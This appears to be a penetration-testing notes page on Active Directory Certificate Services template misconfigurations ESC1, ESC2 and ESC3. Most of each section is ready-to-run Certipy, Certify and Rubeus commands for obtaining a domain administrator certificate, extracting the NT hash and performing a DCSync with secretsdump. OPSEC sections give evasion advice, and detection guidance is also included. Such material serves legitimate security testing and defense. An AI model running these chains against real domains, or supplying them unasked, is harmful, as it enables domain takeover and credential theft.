# ESC1, ESC2, ESC3 — Template Misconfigurations

---

# ESC1 — Subject Alternative Name (SAN) Misconfiguration

## What It Is

ESC1 occurs when a certificate template has the **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** flag set, **Manager Approval is disabled**, and **Authorized Signatures are not required**. This allows any authorized user to request a certificate specifying **any user** in the SAN (Subject Alternative Name) field, including Domain Administrators.

## Why It Works

- The template trusts the requester to supply the subject/SAN
- No manager reviews the request
- The resulting certificate can be used for PKINIT authentication
- Domain-joined machines trust the CA → they trust certificates it issues

### Template Requirements for ESC1

| Setting | Required Value |
|---------|---------------|
| Enrollee Supplies Subject | Enabled (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) |
| Manager Approval | Disabled |
| Authorized Signatures | 0 |
| EKU | Client Authentication, Smart Card Logon, or Any Purpose |
| Requires Template Extensions | Schema v2 but attacker can work around |

## Prerequisites

- Valid domain credentials (any user granted enrollment rights on the template)
- Network access to CA or domain controller
- The template must exist and allow the user to enroll

## Exploitation — Certipy

### Step 1: Find Vulnerable Templates

```bash
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -vulnerable -stdout
```

Look for: `ESC1 - SAN Misconfiguration`

### Step 2: Request Certificate as Domain Admin (UPN)

```bash
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -template 'VulnTemplate' -upn 'administrator@domain.local' -dc-ip 192.168.1.10
```

### Step 3: Request Certificate as Domain Admin (DNS)

```bash
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -template 'VulnTemplate' -upn 'administrator@domain.local' -dns 'dc.domain.local' -dc-ip 192.168.1.10
```

### Step 4: Authenticate with Certificate

```bash
# Get NT hash via PKINIT
certipy auth -pfx 'administrator.pfx' -dc-ip 192.168.1.10

# If that fails, try specifying domain and username
certipy auth -pfx 'administrator.pfx' -domain 'domain.local' -username 'administrator' -dc-ip 192.168.1.10
```

### Step 5: Full Chain to Domain Admin

```bash
# 1. Enumerate
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -vulnerable -stdout

# 2. Request certificate as DA
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -template 'VulnTemplate' -upn 'administrator@domain.local' -dc-ip 192.168.1.10

# 3. Authenticate with PKINIT
certipy auth -pfx 'administrator.pfx' -dc-ip 192.168.1.10

# 4. DCSync with DA hash
impacket-secretsdump -hashes 'LMHASH:NTHASH' 'domain.local/administrator@dc.domain.local'
```

## Exploitation — Certify (Windows)

### Find Vulnerable Templates

```cmd
Certify.exe find /vulnerable
```

### Request Certificate with SAN

```cmd
Certify.exe request /ca:"CA-SERVER.domain.local\CA-NAME" /template:"VulnTemplate" /altname:"administrator@domain.local"
```

### Convert to Hash (via Rubeus)

```cmd
Rubeus.exe asktgt /user:administrator /domain:domain.local /certificate:base64-cert /getcredentials
```

---

# ESC2 — Any Purpose EKU

## What It Is

ESC2 occurs when a certificate template has the **Any Purpose EKU** (`2.5.29.37.0`) or **no EKU** at all. The Any Purpose EKU allows the certificate to be used for **any purpose**, including client authentication, smartcard logon, code signing, encryption, etc. This is effectively as dangerous as ESC1 even without `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` if combined with other misconfigurations.

## Why It Works

- "Any Purpose" supersedes all other purpose restrictions
- If combined with **Editor Key** or if the attacker can control subject/SAN via other means, they can authenticate as any user
- Even without SAN control, an attacker can enroll a cert with their own identity and use it for **all purposes** — including signing malware or decrypting traffic

## Prerequisites

- Domain credentials with enrollment rights on the template
- Template must have Any Purpose EKU or empty EKU list
- CA must issue the template

## Exploitation — Certipy

### Step 1: Find Templates with Any Purpose

```bash
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -stdout -vulnerable
```

Look for: `ESC2 - Any Purpose EKU`

### Step 2: Exploit via SAN (if enabled with ESC1)

If the template also has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`:

```bash
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -template 'VulnTemplateAnyPurpose' -upn 'administrator@domain.local' -dc-ip 192.168.1.10
```

### Step 3: Authenticate

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip 192.168.1.10
```

## Exploitation — Certify (Windows)

```cmd
Certify.exe find /vulnerable
Certify.exe request /ca:"CA-SERVER\CA-NAME" /template:"AnyPurposeTemplate"
```

## OPSEC — ESC1/ESC2

- Certificate requests generate **Event ID 4886** (Certificate Services approved a certificate request) and **Event ID 4887** (Certificate Services issued a certificate)
- The issued certificate's serial number will be logged
- If the target user (e.g. administrator) never enrolled before, looking up issued certs by user will show the anomaly
- Consider using a less monitored account than `administrator`

## Detection — ESC1/ESC2

- **Event ID 4887** — Certificate issued with unusual SAN or for high-privilege user
- **Event ID 4886** — Certificate request with enrollee-supplied subject
- Review issued certificate logs for:
  - Certificates issued to `administrator` or other high-value accounts
  - Certificates where subject name doesn't match the requester
  - Certificates with Any Purpose EKU
- Enable **CA Audit Logging** (Event IDs 4882-4896)
- Use `certutil -view` to inspect issued certificates

---

# ESC3 — Enrollment Agent (Certificate Request Agent)

## What It Is

ESC3 exploits the **Certificate Request Agent** enrollment mechanism. Two templates are involved:
1. **Enrollment Agent template** — has the `Certificate Request Agent` EKU (`1.3.6.1.4.1.311.20.2.1`) which allows a user to enroll on behalf of another user
2. Any **other template** that:
   - Has `Authorized Signatures >= 1` OR `Requires Certificate Request Agent` flag
   - Allows enrollment by the attacker

## Why It Works

- The Enrollment Agent certificate proves the bearer is authorized to request on behalf of others
- Once an attacker has an Enrollment Agent cert, they can request ANY template that accepts authorized signatures as that user
- This is a **legitimate delegation feature** in AD CS that is often misconfigured

## Prerequisites

- Domain credentials with enrollment rights on an Enrollment Agent template
- The Enrollment Agent template must have `Certificate Request Agent` EKU
- A target template must exist that requires authorized signatures or has the Certificate Request Agent flag
- The target template must be enrollable by the attacker (or after getting the enrollment agent cert)

## Exploitation — Certipy

### Step 1: Identify ESC3 Vulnerabilities

```bash
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -vulnerable -stdout
```

Look for: `ESC3`

### Step 2: Request Enrollment Agent Certificate

```bash
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -template 'EnrollmentAgentTemplate' -dc-ip 192.168.1.10
```

Output: `enrollment_agent.pfx`

### Step 3: Request Certificate on Behalf of Domain Admin

```bash
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -template 'TargetTemplate' -on-behalf-of 'domain.local\administrator' -pfx 'enrollment_agent.pfx' -dc-ip 192.168.1.10
```

Output: `administrator.pfx`

### Step 4: Authenticate

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip 192.168.1.10
```

## Exploitation — Certify (Windows)

### Step 1: Find ESC3

```cmd
Certify.exe find /vulnerable
```

### Step 2: Request Enrollment Agent Cert

```cmd
Certify.exe request /ca:"CA-SERVER\CA-NAME" /template:"EnrollmentAgentTemplate"
```

### Step 3: Request Cert as Admin (on behalf of)

```cmd
# Certify doesn't natively support -on-behalf-of like Certipy
# Use makecert or Windows certreq with the enrollment agent cert
certreq.exe -new -att "CertificateTemplate:TargetTemplate" request.inf request.req
# Then use the enrollment agent PFX to sign the request
```

## OPSEC — ESC3

- Requires two certificate requests — more log entries
- The enrollment agent cert itself is logged and may be suspicious
- If the target template has Manager Approval ON, the request will be queued
- Some organizations monitor enrollment agent cert issuance closely

## Detection — ESC3

- **Event ID 4886/4887** — Two certificate requests in quick succession from the same user
- Look for issuance of certificates with `Certificate Request Agent` EKU
- Alert on scenarios where a non-admin user enrolls for an enrollment agent certificate
- Audit template mappings to identify which templates allow enrollment agent delegation
